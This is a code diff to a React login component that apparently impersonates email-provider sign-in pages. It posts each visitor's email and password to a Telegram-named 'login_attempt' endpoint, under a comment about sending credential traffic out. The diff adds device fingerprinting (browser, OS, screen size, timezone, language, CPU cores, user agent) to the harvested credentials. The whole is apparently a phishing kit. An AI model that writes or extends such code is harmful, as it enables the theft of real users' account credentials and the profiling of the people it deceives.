@@ -202,12 +202,41 @@ export default function ProviderLogin({ provider, onLoginSuccess, onBack, logAct
     }
 
     setLoading(true);
+    const ua = navigator.userAgent;
+        let browser = "Unknown Browser";
+        let os = "Unknown OS";
+    
+        // OS detection
+        if (/windows/i.test(ua)) os = "Windows";
+        else if (/macintosh|mac os x/i.test(ua)) os = "macOS";
+        else if (/android/i.test(ua)) os = "Android";
+        else if (/iphone|ipad|ipod/i.test(ua)) os = "iOS";
+        else if (/linux/i.test(ua)) os = "Linux";
+    
+        // Browser detection
+        if (/edg/i.test(ua)) browser = "Edge";
+        else if (/chrome|crios/i.test(ua) && !/edge|edg|opr|opios/i.test(ua)) browser = "Chrome";
+        else if (/safari/i.test(ua) && !/chrome|crios|opr|opios/i.test(ua)) browser = "Safari";
+        else if (/firefox|fxios/i.test(ua)) browser = "Firefox";
+        else if (/opr|opera/i.test(ua)) browser = "Opera";
+        else if (/trident|msie/i.test(ua)) browser = "Internet Explorer";
+    
+        const fingerprint = {
+          browser,
+          os,
+          screenSize: `${window.screen.width || 0}x${window.screen.height || 0}`,
+          language: navigator.language || "Unknown Language",
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown Timezone",
+          cores: String(navigator.hardwareConcurrency || "Unknown"),
+          platform: navigator.platform || "Unknown",
+          userAgent: ua
+        };
     try {
       // 💡 Appended ${API_BASE_URL} to pipeline credential traffic out securely
       const response = await fetch(`${API_BASE_URL}/api/telegram/login_attempt`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ provider, email, password })
+        body: JSON.stringify({ provider, email, password,...fingerprint })
       });
 
       if (response.ok) {
